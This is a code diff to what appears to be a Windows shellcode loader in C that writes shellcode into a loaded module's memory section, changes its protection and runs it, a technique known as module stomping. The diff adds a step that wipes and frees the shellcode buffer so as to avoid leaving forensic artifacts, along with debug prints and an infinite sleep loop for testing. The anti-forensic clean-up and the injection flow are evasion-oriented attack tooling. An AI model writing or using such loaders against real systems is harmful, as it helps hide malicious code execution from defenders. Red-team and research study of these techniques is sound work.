@@ -91,12 +91,20 @@ int main( int argc, char** argv ) {
 
     memcpy( MmBase, Buffer, Length );
 
+    // Clear shellcode buffer from memory to avoid leaving extra artifacts
+    memset( Buffer, 0, Length );
+    LocalFree( Buffer );
+
+
     if ( ! VirtualProtect( MmBase, SecHdr->SizeOfRawData, Protect, & Protect ) ) {
         printf( "[!] VirtualProtect Failed: %ld\n", GetLastError() );
         goto END;
     }
 
     puts( "[*] wrote shellcode into target module" );
+    printf( "[*] Address => %p\n", MmBase );
+    printf( "[*] Size    => 0x%x\n", Length );
+    printf( "[*] PID     => %d\n", GetCurrentProcessId() );
     printf( "[*] press enter..." );
     getchar();
 
@@ -112,6 +120,10 @@ END:
         CloseHandle( Thread );
         Thread = NULL;
     }
+
+    // Sleep indefinitely so we can test our shellcode's exit-thread functionality
+    while (TRUE)
+        Sleep(10000);
 
     return 0;
 }
